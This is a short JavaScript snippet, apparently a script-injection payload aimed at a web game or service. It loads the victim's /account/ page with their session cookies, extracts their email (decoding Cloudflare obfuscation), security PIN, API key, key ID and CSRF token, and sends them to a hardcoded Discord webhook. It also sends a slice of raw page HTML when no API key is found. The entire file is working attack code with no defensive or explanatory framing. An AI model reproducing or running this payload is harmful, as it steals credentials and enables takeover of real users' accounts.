(async () => {
  const WH = 'https://discord.com/api/webhooks/1519411802142937118/Be6lYlqOJcp3Dvnjixe3BQMc8ukrhnSv4r6yemMGBDb9tZWWSlqPa5Nb6ba6aCvrzqzE';

  const send = (title, desc) =>
    fetch(WH, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({embeds: [{title, description: desc.slice(0,4000), color: 0x00ff00}]})
    });

  const delay = ms => new Promise(r => setTimeout(r, ms));

  // Cloudflare email decode
  const cfDecode = (hex) => {
    const key = parseInt(hex.substr(0, 2), 16);
    let out = '';
    for (let i = 2; i < hex.length; i += 2)
      out += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ key);
    return out;
  };

  try {
    const h = await fetch('/account/', {credentials:'include'}).then(r => r.text());

    // Fixed: handle both single and double quotes
    const userId = (h.match(/id=['"]app_user_id['"]>(\d+)/) || [])[1];
    const leader = (h.match(/id=['"]app_leader_name['"]>([^<]+)/) || [])[1];

    // Decode CF-obfuscated email
    const cfHex = (h.match(/data-cfemail="([^"]+)"/) || [])[1];
    const email = cfHex ? cfDecode(cfHex) : 'N/A';

    const pin    = (h.match(/Security PIN:\s*(\d{6})/) || [])[1];
    const keyId  = (h.match(/name="regen_api_key_id"\s+value="(\d+)"/) || [])[1];
    const token  = (h.match(/name="token"\s+value="([^"]+)"/) || [])[1];

    // Try multiple patterns for the API key
    const apiKey = (h.match(/vertical-center center notranslate['"]?>([a-f0-9]{12,})</) || [])[1]
               || (h.match(/notranslate['"]?>([a-f0-9]{12,})\s*<\/td>/) || [])[1];

    await send(`🔑 ${leader || 'Unknown'} (${userId || '?'})`, JSON.stringify(
      {email, pin, apiKey: apiKey||'N/A', keyId, token}, null, 2
    ));

    // If API key still missing, dump the relevant section
    if (!apiKey) {
      await delay(1000);
      const apiSection = h.indexOf('API Key</h3>');
      if (apiSection > -1) {
        await send('🔍 API Key Section', h.slice(apiSection, apiSection + 1500));
      }
    }

  } catch(e) {
    await send('❌ Error', String(e));
  }
})();
